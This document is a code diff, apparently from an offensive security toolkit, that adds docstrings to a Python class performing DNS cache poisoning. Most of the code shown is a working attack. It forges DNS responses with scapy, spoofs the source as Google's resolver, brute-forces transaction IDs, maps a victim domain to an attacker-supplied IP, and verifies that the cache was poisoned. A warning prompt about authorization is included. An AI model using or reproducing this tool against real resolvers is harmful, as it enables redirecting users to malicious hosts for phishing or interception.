@@ -11,15 +11,24 @@ from rich.table import Table
 from rich.progress import Progress
 
 class DNSCachePoisoning:
+    """ 
+    this class simulates cache poisoning by forging dns responses targeted at a dns resolver, attempting to redirect legitimate domain lookups to an attacker-controlled ip address
+    """
     description = "DNS cache poisoning and spoofing attacks"
     
     def __init__(self):
+        """ 
+        initialize the module 
+        """
         self.console = Console()
         self.target_dns_server = None
         self.target_domain = None
         self.malicious_ip = None
         
     def run(self):
+        """ 
+        asks user for configuration, displays selected parameters, asks for authorization confirmation, and triggers the poisoning process
+        """
         try:
             self.console.print(
                 Panel.fit(
@@ -56,6 +65,9 @@ class DNSCachePoisoning:
             )
     
     def _get_attack_config(self):
+        """ 
+        get attack config from user, dns server ip, domain, and malicious ip
+        """
         self.console.print("\n[bold]DNS Poisoning Configuration[/bold]")
         
         dns_server = self.console.input("[cyan]Target DNS server IP[/cyan]: ").strip()
@@ -69,15 +81,20 @@ class DNSCachePoisoning:
         }
     
     def _confirm_attack(self):
+        """ 
+        double check with the user if they want to run the attack
+        """
         confirm = self.console.input(
             "\n[bold red]WARNING: This attack may be illegal without proper authorization. Continue?[/bold red] (y/N): "
         ).strip().lower()
         return confirm == 'y'
     
     def _perform_dns_poisoning(self):
+        """
+        start dns cache poisoning attempt by generating multiple forged dns responses using randomized transaction IDs. Displays progress, handles packet dispatch failures, and triggers a verification routine after completion
+        """
         self.console.print("\n[bold]Starting DNS Cache Poisoning...[/bold]")
         
-        # Generate transaction IDs to spoof
         transaction_ids = [random.randint(1, 65535) for _ in range(100)]
         
         with Progress() as progress:
@@ -87,7 +104,7 @@ class DNSCachePoisoning:
                 try:
                     self._send_poisoned_response(txid)
                     progress.update(task, advance=1)
-                    time.sleep(0.1)  # Rate limiting
+                    time.sleep(0.1)
                 except Exception as e:
                     self.console.print(f"[yellow]Failed to send packet with TXID {txid}: {e}[/yellow]")
         
@@ -101,14 +118,13 @@ class DNSCachePoisoning:
         self._verify_poisoning()
     
     def _send_poisoned_response(self, transaction_id):
-        """Send a forged DNS response to poison the cache"""
-        # Create IP layer
-        ip = IP(dst=self.target_dns_server, src="8.8.8.8")  # Spoofed source (pretending to be Google DNS)
+        """
+        create a forged dns response packet to the target dns server intended to poison its cache by associating a malicious IP with the victim domain
+        """
+        ip = IP(dst=self.target_dns_server, src="8.8.8.8")  #spoofed source google dns you can change this to cloudflare (1.1.1.1) or whatever dns you like
         
-        # Create UDP layer
         udp = UDP(dport=53, sport=53)
         
-        # Create DNS response with malicious data
         dns = DNS(
             id=transaction_id,
             qr=1,  # Response
@@ -123,7 +139,7 @@ class DNSCachePoisoning:
                 rrname=self.target_domain,
                 type="A",
                 rclass="IN",
-                ttl=300,  # 5 minutes TTL
+                ttl=300,  # TTL is in seconds 300s=5mins
                 rdata=self.malicious_ip
             ),
             ar=DNSRR(
@@ -135,16 +151,16 @@ class DNSCachePoisoning:
             )
         )
         
-        # Send the packet
         packet = ip/udp/dns
         send(packet, verbose=0)
     
     def _verify_poisoning(self):
-        """Verify if the poisoning was successful"""
+        """
+        query the victim dns server to determine whether cache pollution was successful. Displays resulting resource records in a formatted table
+        """
         self.console.print("\n[bold]Verifying DNS cache poisoning...[/bold]")
         
         try:
-            # Query the poisoned DNS server
             resolver = dns.resolver.Resolver()
             resolver.nameservers = [self.target_dns_server]
             
